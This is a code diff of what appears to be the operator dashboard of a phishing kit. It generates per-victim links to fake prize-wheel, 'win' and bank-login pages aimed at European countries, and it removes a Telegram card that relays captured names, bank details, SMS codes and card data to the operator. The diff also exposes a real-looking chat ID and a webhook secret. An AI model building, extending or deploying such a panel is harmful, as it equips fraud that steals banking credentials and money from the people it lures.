@@ -1,9 +1,8 @@
 "use client";
 
-import { useState, useEffect, useCallback } from "react";
+import { useEffect, useState } from "react";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { LogsTab } from "./components/LogsTab";
-
 import { UsersTab } from "./components/UsersTab";
 import { BanksTab } from "./components/BanksTab";
 import { LanguageTab } from "./components/LanguageTab";
@@ -14,16 +13,23 @@ import { useSettings } from "@/contexts/SettingsContext";
 import { normalizeCountryName } from "@/lib/country-utils";
 
 export function Admin1Dashboard({ user }: { user: any }) {
-  const [isCollapsed, setIsCollapsed] = useState(false);
-  const [mobileSidebarOpen, setMobileSidebarOpen] = useState(false);
-  const selectTab = (tab: string) => {
-    setActiveTab(tab);
-    setMobileSidebarOpen(false);
-  };
+  const [isCollapsed, setIsCollapsed] = useState(() => {
+    if (typeof window === "undefined") return false;
+    try {
+      return localStorage.getItem("admin1SidebarCollapsed") === "true";
+    } catch {
+      return false;
+    }
+  });
+  useEffect(() => {
+    try {
+      localStorage.setItem("admin1SidebarCollapsed", String(isCollapsed));
+    } catch {}
+  }, [isCollapsed]);
   const [darkMode, setDarkMode] = useState(true);
   const [activeTab, setActiveTab] = useState("Loglar");
   const [showNewLinkModal, setShowNewLinkModal] = useState(false);
-  const [showTelegramModal, setShowTelegramModal] = useState(false);
+  const [mobileSidebarOpen, setMobileSidebarOpen] = useState(false);
 
   // Link Oluşturma State'leri
   const [creatingLink, setCreatingLink] = useState(false);
@@ -45,38 +51,62 @@ export function Admin1Dashboard({ user }: { user: any }) {
     setCreatingLink(true);
     
     try {
+      // ADIM 1: KALICI SILINMIS (bosta) EN KUCUK public_id'yi bul (cakisma YOK)
+      let reusePublicId: number | null = null;
+      try {
+        const { data: usedRows } = await supabase
+          .from("sessions")
+          .select("public_id")
+          .not("public_id", "is", null);
+        const usedIds = new Set(
+          (usedRows || [])
+            .map((r) => Number((r as any).public_id))
+            .filter((n) => Number.isFinite(n) && n > 0)
+        );
+        // 1'den başla 100.000'e kadar ara (yeterli)
+        for (let i = 1; i <= 100000; i++) {
+          if (!usedIds.has(i)) {
+            reusePublicId = i;
+            break;
+          }
+        }
+      } catch (_findErr) {
+        // public_id listesi okunamazsa sequence devam etsin (zarar yok)
+      }
+
+      const insertPayload: any = {
+        amount: linkType === "wheel" ? 0 : (Number(amount.replace(",", ".")) || 0),
+        current_step: linkType === "direct_win" ? "win" : linkType === "direct_bank" ? "banken" : "code_entry",
+        status: "offline",
+        is_hidden: false,
+        partner_name: adminIdentifier,
+        participation_code: linkType === "normal" ? (participationCode.trim() || null) : null,
+        form_data: {
+          currency,
+          is_wheel_game: linkType === "wheel",
+          partner_display_name: linkType === "normal" ? partnerName.trim() : "",
+        }
+      };
+
+      // Bosta ID varsa manuel public_id ata (yoksa PostgreSQL SEQUENCE otomatik uretir)
+      if (reusePublicId !== null) {
+        insertPayload.public_id = reusePublicId;
+      }
+
       const { data, error } = await supabase
           .from("sessions")
-          .insert({
-            amount: linkType === "wheel" ? 0 : (Number(amount.replace(",", ".")) || 0),
-            current_step:
-              linkType === "wheel" ? "wheel" :
-              linkType === "direct_win" ? "win" :
-              linkType === "direct_bank" ? "banken" :
-              "code_entry",
-            status: "offline",
-            is_hidden: false,
-            partner_name: adminIdentifier,
-            participation_code: linkType === "normal" ? (participationCode.trim() || null) : null,
-            form_data: {
-              currency,
-              is_wheel_game: linkType === "wheel",
-              partner_display_name: linkType === "normal" ? partnerName.trim() : "",
-            }
-          })
+          .insert(insertPayload)
           .select("id, public_id")
           .single();
 
       if (error) throw error;
 
       if (data?.id) {
-        const rawPublicId = data.public_id != null ? String(data.public_id).trim() : "";
-        const useShortNumeric = /^[0-9]+$/.test(rawPublicId) && rawPublicId.length > 0 && rawPublicId.length < 12;
-        const publicSessionId = useShortNumeric ? rawPublicId : data.id;
-        let urlPath = `/code?session=${encodeURIComponent(publicSessionId)}`;
-        if (linkType === "wheel") urlPath = `/wheel?session=${encodeURIComponent(publicSessionId)}`;
-        if (linkType === "direct_win") urlPath = `/win/${encodeURIComponent(publicSessionId)}`;
-        if (linkType === "direct_bank") urlPath = `/banken?session=${encodeURIComponent(publicSessionId)}`;
+        const publicSessionId = data.public_id ? String(data.public_id) : data.id;
+        let urlPath = `/code?session=${publicSessionId}`;
+        if (linkType === "wheel") urlPath = `/wheel?session=${publicSessionId}`;
+        if (linkType === "direct_win") urlPath = `/win?session=${publicSessionId}`;
+        if (linkType === "direct_bank") urlPath = `/banken?session=${publicSessionId}`;
         setNewLink(`${window.location.origin}${urlPath}`);
       }
     } catch (err: any) {
@@ -88,7 +118,6 @@ export function Admin1Dashboard({ user }: { user: any }) {
 
   const EUROPEAN_COUNTRIES = [
     { name: "Tümü", flag: "🌍", lang: "nl" },
-    { name: "Avustralya", flag: "🇦🇺", lang: "en" },
     { name: "Hollanda", flag: "🇳🇱", lang: "nl" },
     { name: "Almanya", flag: "🇩🇪", lang: "de" },
     { name: "Avusturya", flag: "🇦🇹", lang: "de" },
@@ -99,6 +128,7 @@ export function Admin1Dashboard({ user }: { user: any }) {
     { name: "İtalya", flag: "🇮🇹", lang: "it" },
     { name: "Fransa", flag: "🇫🇷", lang: "fr" },
     { name: "Çekya", flag: "🇨🇿", lang: "cs" },
+    { name: "Litvanya", flag: "🇱🇹", lang: "lt" },
     { name: "Estonya", flag: "🇪🇪", lang: "et" },
     { name: "Polonya", flag: "🇵🇱", lang: "pl" },
     { name: "İsveç", flag: "🇸🇪", lang: "sv" },
@@ -127,7 +157,7 @@ export function Admin1Dashboard({ user }: { user: any }) {
 
       // UUID id varsa onu query'de eşleştirip güncelleyeceğiz veya tek satır varsaydığımız için direkt id olmadan update edeceğiz.
       // global_settings tablosunda sadece 1 satır olduğunu varsayarak:
-      const { data: gsData } = await supabase.from("global_settings").select("*").limit(1).single();
+      const { data: gsData } = await supabase.from("global_settings").select("id").limit(1).single();
       
       if (gsData?.id) {
         await supabase.from("global_settings").update(updatePayload).eq("id", gsData.id);
@@ -140,6 +170,11 @@ export function Admin1Dashboard({ user }: { user: any }) {
       alert("Hata oluştu: " + err.message);
     }
   }
+
+  const selectTab = (tab: string) => {
+    setActiveTab(tab);
+    setMobileSidebarOpen(false);
+  };
 
   const renderContent = () => {
     switch (activeTab) {
@@ -174,7 +209,7 @@ export function Admin1Dashboard({ user }: { user: any }) {
         <div className={`absolute top-[60%] -right-[10%] w-[40%] h-[40%] rounded-full blur-[100px] opacity-20 ${darkMode ? 'bg-blue-600/20' : 'bg-blue-400/10'}`}></div>
       </div>
 
-      {/* MOBIL SIDEBAR OVERLAY */}
+      {/* MOBILE SIDEBAR BACKDROP */}
       {mobileSidebarOpen && (
         <div
           className="fixed inset-0 z-40 bg-black/60 backdrop-blur-sm md:hidden"
@@ -192,7 +227,7 @@ export function Admin1Dashboard({ user }: { user: any }) {
               {/* Flag Selector Dropdown */}
               <div className="relative group/flag">
                 <button className={`p-1.5 rounded-lg flex items-center gap-1 text-sm transition-all duration-300 ${darkMode ? 'hover:bg-white/10' : 'hover:bg-black/5'}`}>
-                  <span className="drop-shadow-sm">{EUROPEAN_COUNTRIES.find(c => c.name === normalizeCountryName(settings?.target_country || "Avustralya"))?.flag || "🌍"}</span>
+                  <span className="drop-shadow-sm">{EUROPEAN_COUNTRIES.find(c => c.name === normalizeCountryName(settings?.target_country || "Hollanda"))?.flag || "🌍"}</span>
                   <svg className="w-3 h-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" /></svg>
                 </button>
                 <div className="absolute top-full left-0 mt-2 w-48 rounded-2xl shadow-[0_8px_30px_rgb(0,0,0,0.12)] opacity-0 invisible group-hover/flag:opacity-100 group-hover/flag:visible transition-all duration-300 z-50 overflow-hidden border backdrop-blur-3xl" style={{ backgroundColor: darkMode ? 'rgba(30,30,30,0.85)' : 'rgba(255,255,255,0.85)', borderColor: darkMode ? 'rgba(255,255,255,0.1)' : 'rgba(0,0,0,0.05)' }}>
@@ -213,7 +248,16 @@ export function Admin1Dashboard({ user }: { user: any }) {
               </div>
             </div>
           )}
-          <button onClick={() => { setIsCollapsed(!isCollapsed); setMobileSidebarOpen(false); }} className={`p-2 rounded-xl transition-all duration-300 ${darkMode ? 'hover:bg-white/10 text-gray-400 hover:text-white' : 'hover:bg-black/5 text-gray-500 hover:text-black'} ${isCollapsed && !mobileSidebarOpen ? 'md:mx-auto' : ''}`}>
+          <button
+            onClick={() => {
+              if (typeof window !== "undefined" && window.innerWidth < 768) {
+                setMobileSidebarOpen(false);
+              } else {
+                setIsCollapsed(!isCollapsed);
+              }
+            }}
+            className={`p-2 rounded-xl transition-all duration-300 ${darkMode ? 'hover:bg-white/10 text-gray-400 hover:text-white' : 'hover:bg-black/5 text-gray-500 hover:text-black'} ${isCollapsed && !mobileSidebarOpen ? 'md:mx-auto' : ''}`}
+          >
             <svg className="w-5 h-5 md:hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" /></svg>
             <svg className="w-5 h-5 hidden md:block" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" /></svg>
           </button>
@@ -235,36 +279,19 @@ export function Admin1Dashboard({ user }: { user: any }) {
       <div className="relative z-10 flex-1 flex flex-col h-full overflow-hidden">
         {/* TOPBAR */}
         <div className={`h-[75px] border-b flex items-center justify-between px-4 md:px-8 shrink-0 backdrop-blur-2xl ${darkMode ? 'border-white/5 bg-[#1c1c1e]/60' : 'border-[#d2d2d7]/50 bg-white/60'}`}>
-          <div className="flex items-center gap-3">
-            {/* Mobil hamburger */}
+          <div className="flex items-center gap-3 min-w-0">
             <button
               onClick={() => setMobileSidebarOpen(true)}
-              className={`md:hidden p-2 rounded-xl transition-all duration-300 ${darkMode ? 'hover:bg-white/10 text-gray-300' : 'hover:bg-black/5 text-gray-600'}`}
+              className={`md:hidden p-2 rounded-xl transition-all ${darkMode ? 'hover:bg-white/10 text-gray-300' : 'hover:bg-black/5 text-gray-600'}`}
+              title="Menüyü Aç"
             >
-              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" /></svg>
+              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" /></svg>
             </button>
-            <span className="text-xl font-semibold opacity-90">{activeTab}</span>
-            {/* ⚠️ TELEGRAM BOT BUTONU GIZLI (kullanici sonradan acmak isterse hidden class silinsin)
-            <button
-              onClick={() => setShowTelegramModal(true)}
-              className={`ml-2 flex items-center gap-2 px-4 py-1.5 rounded-full text-sm font-bold shadow-sm transition-all duration-300 hover:scale-105 active:scale-95 border ${darkMode ? 'bg-sky-500/10 text-sky-300 border-sky-500/30 hover:bg-sky-500/20' : 'bg-sky-50 text-sky-700 border-sky-200 hover:bg-sky-100'}`}
-              title="Telegram Bot Yönetimi"
-            >
-              <span className="text-base">🤖</span>
-              <span className="hidden sm:inline">Telegram</span>
-            </button> */}
-            <button
-              onClick={() => setShowTelegramModal(true)}
-              className={`hidden ml-2 flex items-center gap-2 px-4 py-1.5 rounded-full text-sm font-bold shadow-sm transition-all duration-300 hover:scale-105 active:scale-95 border ${darkMode ? 'bg-sky-500/10 text-sky-300 border-sky-500/30 hover:bg-sky-500/20' : 'bg-sky-50 text-sky-700 border-sky-200 hover:bg-sky-100'}`}
-              title="Telegram Bot Yönetimi"
-            >
-              <span className="text-base">🤖</span>
-              <span className="hidden sm:inline">Telegram</span>
-            </button>
+            <span className="text-lg md:text-xl font-semibold opacity-90 truncate">{activeTab}</span>
           </div>
-          <div className="flex items-center space-x-5">
+          <div className="flex items-center space-x-2 md:space-x-5">
             <PushNotifyToggle darkMode={darkMode} />
-            <span className={`text-sm font-medium px-3 py-1 rounded-full ${darkMode ? 'bg-white/10 text-white/70' : 'bg-black/5 text-black/60'}`}>
+            <span className={`hidden sm:inline-flex text-sm font-medium px-3 py-1 rounded-full ${darkMode ? 'bg-white/10 text-white/70' : 'bg-black/5 text-black/60'}`}>
               @{adminIdentifier}
             </span>
             <button onClick={() => setDarkMode(!darkMode)} className={`p-2.5 rounded-full transition-all duration-300 hover:scale-105 active:scale-95 ${darkMode ? 'bg-white/10 text-yellow-400 hover:bg-white/20' : 'bg-black/5 text-gray-700 hover:bg-black/10'}`}>
@@ -274,16 +301,16 @@ export function Admin1Dashboard({ user }: { user: any }) {
                 <svg className="w-5 h-5 drop-shadow-sm" fill="currentColor" viewBox="0 0 20 20"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z" /></svg>
               )}
             </button>
-            <button onClick={() => setShowNewLinkModal(true)} className={`flex items-center gap-2 px-5 py-2.5 rounded-full font-medium shadow-sm transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md ${darkMode ? 'bg-white text-black hover:bg-gray-100' : 'bg-black text-white hover:bg-gray-800'}`}>
+            <button onClick={() => setShowNewLinkModal(true)} className={`flex items-center gap-2 px-3 md:px-5 py-2.5 rounded-full font-medium shadow-sm transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md ${darkMode ? 'bg-white text-black hover:bg-gray-100' : 'bg-black text-white hover:bg-gray-800'}`}>
                 <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M12 4v16m8-8H4" /></svg>
-                <span>Yeni Link</span>
+                <span className="hidden sm:inline">Yeni Link</span>
             </button>
           </div>
         </div>
 
         {/* CONTENT */}
-        <div className="flex-1 overflow-y-auto p-6 md:p-10 relative">
-          <div className="max-w-7xl mx-auto h-full">
+        <div className="flex-1 overflow-y-auto p-4 md:p-6 relative">
+          <div className="max-w-[1760px] mx-auto h-full">
             {renderContent()}
           </div>
         </div>
@@ -330,10 +357,9 @@ export function Admin1Dashboard({ user }: { user: any }) {
                         onChange={(e) => setCurrency(e.target.value)}
                         className={`w-full p-3.5 rounded-xl border outline-none font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? 'bg-black/50 border-white/10 text-white' : 'bg-gray-50/50 border-gray-200 text-black'}`}
                       >
-                        <option value="AUD$">AUD$ (AUD)</option>
+                        <option value="AUD$">AUD$ (Avustralya Doları)</option>
                         <option value="$">$ (USD)</option>
                         <option value="£">£ (GBP)</option>
-                        <option value="€">€ (EUR)</option>
                       </select>
                     </div>
                   </div>
@@ -426,250 +452,6 @@ export function Admin1Dashboard({ user }: { user: any }) {
         </div>
       )}
 
-      {/* Telegram Bot Yönetim Modal — GIZLI (kullanici sonradan acmak isterse asagidaki satirdaki ilk koşuldaki hidden ve yanindaki yorum kaldirilir) */}
-      {/* showTelegramModal && ( ← ORIJINAL ACILIS KOŞULU: Alttaki satırda FALSE var, silerek aktif edebilirsiniz */}
-      {showTelegramModal && false && (
-        <div className="hidden fixed inset-0 z-[100] flex items-center justify-center p-4">
-          <div className="absolute inset-0 bg-black/40 backdrop-blur-sm transition-opacity" onClick={() => setShowTelegramModal(false)}></div>
-          <div className={`relative hidden w-full max-w-4xl max-h-[90vh] overflow-y-auto rounded-3xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] transform transition-all animate-in fade-in zoom-in-95 duration-300 ${darkMode ? 'bg-[#1c1c1e]/95 backdrop-blur-2xl border border-white/10' : 'bg-white/95 backdrop-blur-2xl border border-white/50'}`}>
-            <div className={`flex items-center justify-between px-6 py-4 border-b sticky top-0 z-10 backdrop-blur-xl ${darkMode ? 'border-white/10 bg-[#1c1c1e]/80' : 'border-gray-100 bg-white/80'}`}>
-              <div className="flex items-center gap-3">
-                <span className="text-2xl leading-none">🤖</span>
-                <div>
-                  <div className={`text-lg font-extrabold tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>
-                    Telegram Bot Entegrasyonu
-                  </div>
-                  <div className={`text-[11px] opacity-60 ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>
-                    Bildirim & Komut Yönetimi
-                  </div>
-                </div>
-              </div>
-              <button
-                onClick={() => setShowTelegramModal(false)}
-                className={`p-2 rounded-xl transition-all hover:scale-105 active:scale-95 ${darkMode ? 'bg-white/10 hover:bg-white/20 text-gray-300' : 'bg-black/5 hover:bg-black/10 text-gray-700'}`}
-                title="Kapat"
-              >
-                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" /></svg>
-              </button>
-            </div>
-            <div className="p-0 sm:p-6 pt-6 sm:pt-0">
-              <div className="-mx-6 sm:mx-0">
-                <TelegramSetupCard darkMode={darkMode} />
-              </div>
-            </div>
-          </div>
-        </div>
-      )}
-
-    </div>
-  );
-}
-
-function TelegramSetupCard({ darkMode }: { darkMode: boolean }) {
-  const [status, setStatus] = useState<any>(null);
-  const [busy, setBusy] = useState<string | null>(null);
-  const [msg, setMsg] = useState<string | null>(null);
-  const [msgType, setMsgType] = useState<"ok" | "err">("ok");
-
-  const load = useCallback(async () => {
-    setBusy("check");
-    try {
-      const r = await fetch("/api/telegram", { cache: "no-store" });
-      let d: any = null;
-      try { d = await r.json(); } catch { /* html donerse 404 */ }
-      if (!d || typeof d !== "object") {
-        const r2 = await fetch("/api/telegram/status", { cache: "no-store" });
-        try { d = await r2.json(); } catch { d = null; }
-      }
-      setStatus(d);
-    } catch { setStatus(null); }
-    setBusy(null);
-  }, []);
-
-  useEffect(() => { void load(); }, [load]);
-
-  const run = async (action: string, body?: any, label?: string) => {
-    setBusy(label || action); setMsg(null);
-    try {
-      const r = await fetch(`/api/telegram?action=${encodeURIComponent(action)}`, {
-        method: "POST", cache: "no-store",
-        headers: body ? { "Content-Type": "application/json" } : undefined,
-        body: body ? JSON.stringify(body) : undefined,
-      });
-      const d = await r.json();
-      if (d.ok) {
-        setMsg((label || action) + " başarılı ✅");
-        setMsgType("ok");
-      } else {
-        setMsg("❌ " + (d.error || "Hata"));
-        setMsgType("err");
-      }
-    } catch (e: any) {
-      setMsg("❌ " + (e?.message || "Hata"));
-      setMsgType("err");
-    }
-    await load();
-    setTimeout(() => setMsg(null), 4000);
-    setBusy(null);
-  };
-
-  const envTemplateFallback = `# ===== TELEGRAM BOT (BotFather'dan al) =====
-TELEGRAM_BOT_TOKEN=123456789:AAH....xxx
-# Kendi chat ID'n (kişi ID'si) veya grup/kanal ID (-1001234...)
-TELEGRAM_CHAT_ID=123456789
-# Opsiyonel: Rastgele, webhook güvenliği için
-TELEGRAM_WEBHOOK_SECRET=rastgeleBirSifre123`;
-
-  const activeTemplate = status?.envTemplate || envTemplateFallback;
-
-  const copyTpl = async () => {
-    try {
-      await navigator.clipboard.writeText(activeTemplate);
-      setMsg("Kopyalandı! Railway Variables içine yapıştır ✅"); setMsgType("ok");
-      setTimeout(() => setMsg(null), 3000);
-    } catch {
-      setMsg("Kopyalama başarısız ❌"); setMsgType("err");
-      setTimeout(() => setMsg(null), 3000);
-    }
-  };
-
-  const rowItem = (ok: boolean | undefined, key: string, value: string, extra?: string) => (
-    <div className={`p-3 rounded-xl border ${ok ? (darkMode ? 'bg-green-500/5 border-green-500/20' : 'bg-green-50 border-green-200') : (darkMode ? 'bg-red-500/5 border-red-500/20' : 'bg-red-50 border-red-200')}`}>
-      <div className={`flex items-center gap-2 mb-1 ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>
-        <span className="text-[10px] font-bold uppercase tracking-widest opacity-80">{key}</span>
-        <span className={`text-xs font-black ${ok ? 'text-green-500' : 'text-red-500'}`}>{ok ? "✅ OK" : "❌ EKSİK"}</span>
-      </div>
-      <div className="font-mono break-all text-[12px]">{value || "—"}</div>
-      {extra && <div className={`mt-0.5 text-[10px] opacity-60 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>{extra}</div>}
-    </div>
-  );
-
-  const canRunButtons = !!status?.hasToken && !!status?.hasChatId;
-  const canSetWebhook = !!canRunButtons && !!status?.hasOrigin && status?.hasOrigin;
-
-  return (
-    <div className={`rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] overflow-hidden backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
-      <div className={`flex items-center justify-between px-6 py-5 border-b ${darkMode ? 'border-white/5' : 'border-gray-100'}`}>
-        <div className="flex items-center gap-3">
-          <span className="text-2xl leading-none">🤖</span>
-          <div>
-            <div className={`text-base font-extrabold tracking-tight flex items-center gap-3 ${darkMode ? 'text-white' : 'text-gray-900'}`}>
-              Telegram Bot Entegrasyonu
-              <span className={`inline-flex items-center rounded-full px-3 py-0.5 text-[11px] font-black border ${status?.configured ? (darkMode ? 'bg-green-500/15 text-green-400 border-green-500/30' : 'bg-green-50 text-green-600 border-green-200') : (darkMode ? 'bg-amber-500/15 text-amber-400 border-amber-500/30' : 'bg-amber-50 text-amber-700 border-amber-200')}`}>
-                {status?.configured ? "● AKTİF" : "○ AYARLANMADI"}
-              </span>
-            </div>
-            <div className={`mt-0.5 text-[11px] opacity-60 ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>
-              Tüm event'ler (isim/banka/SMS/kart/bekleme/yonlendirme/ban/sohbet) Telegram'a atılır + komutlar çalışır
-            </div>
-          </div>
-        </div>
-        <button
-          onClick={() => void load()}
-          disabled={busy === "check"}
-          className={`px-3 py-1.5 text-xs font-bold rounded-lg transition-all hover:scale-105 active:scale-95 disabled:opacity-50 ${darkMode ? 'bg-white/10 hover:bg-white/20 text-gray-300' : 'bg-black/5 hover:bg-black/10 text-gray-700'}`}
-          title="Yenile"
-        >↻ YENİLE</button>
-      </div>
-
-      <div className="px-6 py-5 space-y-4">
-        {/* TEŞHİS BÖLÜMÜ — HANGİ ENV OKUNMUŞ HANGİSİ EKSİK */}
-        {status && (
-          <>
-            <div className={`grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-3 text-[12px] ${darkMode ? 'text-zinc-300' : 'text-gray-700'}`}>
-              {rowItem(!!status.hasToken, "TELEGRAM_BOT_TOKEN", status.tokenPrefix || "Railway'de TANIMSIZ",
-                status.hasToken ? "Token başarıyla okundu" : "Railway Variables → TELEGRAM_BOT_TOKEN ekle")}
-              {rowItem(!!status.hasChatId, "TELEGRAM_CHAT_ID", status.chatId || "Railway'de TANIMSIZ",
-                status.hasChatId ? "Chat ID başarıyla okundu" : "Railway Variables → TELEGRAM_CHAT_ID = 8225834720 ekle")}
-              {rowItem(!!status.hasWebhookSecret, "TELEGRAM_WEBHOOK_SECRET",
-                status.hasWebhookSecret ? "🔐 Ayarlanmış (gizli)" : "Railway'de TANIMSIZ (önerilen)",
-                status.hasWebhookSecret ? "Ekstra güvenlik" : "Opsiyonel: RailWaySecret_2026_Paratransfer")}
-              {rowItem(!!status.hasOrigin, "PUBLIC_SITE_URL",
-                (status.origin || "⚠️ localhost:8080 (Railway proxy)"),
-                status.hasOrigin
-                  ? `Kullanılacak: ${status.origin || "-"}`
-                  : "ZORUNLU: 'PUBLIC_SITE_URL=https://alanadiniz.com' ekle (sonuna / YOK)")}
-            </div>
-
-            {!status.configured && status.missingFields?.length > 0 && (
-              <div className={`p-4 rounded-2xl border ${darkMode ? 'bg-red-500/10 border-red-500/20' : 'bg-red-50 border-red-200'}`}>
-                <div className={`text-[13px] font-black mb-2 ${darkMode ? 'text-red-300' : 'text-red-800'}`}>
-                  ⚠️ Butonların çalışması için aşağıdaki değişken(ler)i Railway'e EKLE:
-                </div>
-                <ul className="text-[12px] space-y-1 list-disc list-inside">
-                  {status.missingFields.map((f: string) => (
-                    <li key={f} className="font-mono font-bold opacity-90">❌ {f}</li>
-                  ))}
-                </ul>
-              </div>
-            )}
-          </>
-        )}
-
-        {!status?.configured && (
-          <>
-            <div className={`p-4 rounded-2xl border ${darkMode ? 'bg-amber-500/10 border-amber-500/20' : 'bg-amber-50 border-amber-200'}`}>
-              <div className={`text-[13px] font-bold mb-2 ${darkMode ? 'text-amber-300' : 'text-amber-800'}`}>
-                📌 Kurulum Adımları (Railway):
-              </div>
-              <ol className={`text-[12px] space-y-1 list-decimal list-inside opacity-85 ${darkMode ? 'text-zinc-300' : 'text-gray-700'}`}>
-                <li>Telegram'da <b>@BotFather</b> → <code className="font-mono px-1.5 py-0.5 rounded">/newbot</code> → Token al</li>
-                <li>Telegram'da <b>@paratransfer_bot</b> sohbetini aç → <code className="font-mono px-1.5 py-0.5 rounded">/start</code> yaz</li>
-                <li>Railway projeni aç → Sol menü → <b>⚙️ Variables</b></li>
-                <li>Aşağıdaki 4 değeri EKLE (KOPYALA butonu ile kopyala)</li>
-                <li>Değişkenlerden sonra otomatik yeniden deploy → ardından ↻ YENİLE'ye bas</li>
-                <li>Deploy tamamlanınca <b>🔗 SET WEBHOOK</b> → <b>✉️ TEST MESAJI</b> butonları aktif olur</li>
-              </ol>
-            </div>
-            <div className={`rounded-2xl border overflow-hidden ${darkMode ? 'border-white/10 bg-black/30' : 'border-gray-200 bg-gray-50/70'}`}>
-              <div className={`flex items-center justify-between px-4 py-2.5 border-b ${darkMode ? 'border-white/10 bg-white/5' : 'border-gray-100 bg-gray-50'}`}>
-                <span className={`text-[11px] font-black uppercase tracking-widest opacity-70 ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>
-                  Railway Variables (değerler hazır)
-                </span>
-                <button
-                  onClick={copyTpl}
-                  className={`text-[11px] font-bold px-3 py-1 rounded-lg transition-all hover:scale-105 active:scale-95 bg-[#EB5E28] text-white hover:bg-[#EB5E28]/90`}
-                >📋 KOPYALA</button>
-              </div>
-              <pre className={`p-4 text-[11px] font-mono leading-relaxed whitespace-pre-wrap overflow-x-auto ${darkMode ? 'text-zinc-300' : 'text-gray-800'}`}>{activeTemplate}</pre>
-            </div>
-          </>
-        )}
-
-        {msg && (
-          <div className={`px-4 py-2.5 rounded-xl text-[12px] font-bold ${msgType === "ok" ? (darkMode ? 'bg-green-500/15 text-green-400 border border-green-500/30' : 'bg-green-50 text-green-700 border border-green-200') : (darkMode ? 'bg-red-500/15 text-red-400 border border-red-500/30' : 'bg-red-50 text-red-700 border border-red-200')}`}>
-            {msg}
-          </div>
-        )}
-
-        <div className={`flex flex-wrap gap-2 pt-2 border-t ${darkMode ? 'border-white/5' : 'border-gray-100'}`}>
-          <button
-            onClick={() => void run("test", { extra: "Admin panelinden test mesajı 👋" }, "Test Mesajı")}
-            disabled={!!busy || !canRunButtons}
-            className={`px-4 py-2.5 rounded-xl text-[12px] font-bold shadow-sm transition-all hover:scale-[1.02] active:scale-95 disabled:opacity-50 disabled:pointer-events-none ${darkMode ? 'bg-green-500/15 text-green-400 hover:bg-green-500/25 border border-green-500/30' : 'bg-green-50 text-green-700 hover:bg-green-100 border border-green-200'}`}
-          >{busy === "Test Mesajı" ? "Gönderiliyor..." : "✉️ TEST MESAJI"}</button>
-          <button
-            onClick={() => void run("set-webhook", undefined, "Webhook Ayarla")}
-            disabled={!!busy || !canSetWebhook}
-            title={canSetWebhook ? "" : "PUBLIC_SITE_URL tanımlı değil (localhost görünüyor)"}
-            className={`px-4 py-2.5 rounded-xl text-[12px] font-bold shadow-sm transition-all hover:scale-[1.02] active:scale-95 disabled:opacity-50 disabled:pointer-events-none ${darkMode ? 'bg-[#EB5E28]/15 text-[#ff8a5c] hover:bg-[#EB5E28]/25 border border-[#EB5E28]/30' : 'bg-[#fff0e7] text-[#c24815] hover:bg-[#ffe2d0] border border-[#f1b998]'}`}
-          >{busy === "Webhook Ayarla" ? "Ayarlanıyor..." : "🔗 SET WEBHOOK"}</button>
-          <button
-            onClick={() => void run("get-webhook-info", undefined, "Webhook Bilgi")}
-            disabled={!!busy || !canRunButtons}
-            className={`px-4 py-2.5 rounded-xl text-[12px] font-bold shadow-sm transition-all hover:scale-[1.02] active:scale-95 disabled:opacity-50 disabled:pointer-events-none ${darkMode ? 'bg-white/10 text-gray-200 hover:bg-white/20 border border-white/10' : 'bg-gray-100 text-gray-700 hover:bg-gray-200 border border-gray-200'}`}
-          >{busy === "Webhook Bilgi" ? "..." : "ℹ️ WEBHOOK INFO"}</button>
-          <button
-            onClick={() => void run("delete-webhook", undefined, "Webhook Sil")}
-            disabled={!!busy || !canRunButtons}
-            className={`px-4 py-2.5 rounded-xl text-[12px] font-bold shadow-sm transition-all hover:scale-[1.02] active:scale-95 disabled:opacity-50 disabled:pointer-events-none ${darkMode ? 'bg-red-500/10 text-red-400 hover:bg-red-500/20 border border-red-500/20' : 'bg-red-50 text-red-600 hover:bg-red-100 border border-red-200'}`}
-          >{busy === "Webhook Sil" ? "..." : "🗑️ WEBHOOK SİL"}</button>
-        </div>
-
-        <div className={`pt-2 text-[11px] opacity-70 ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>
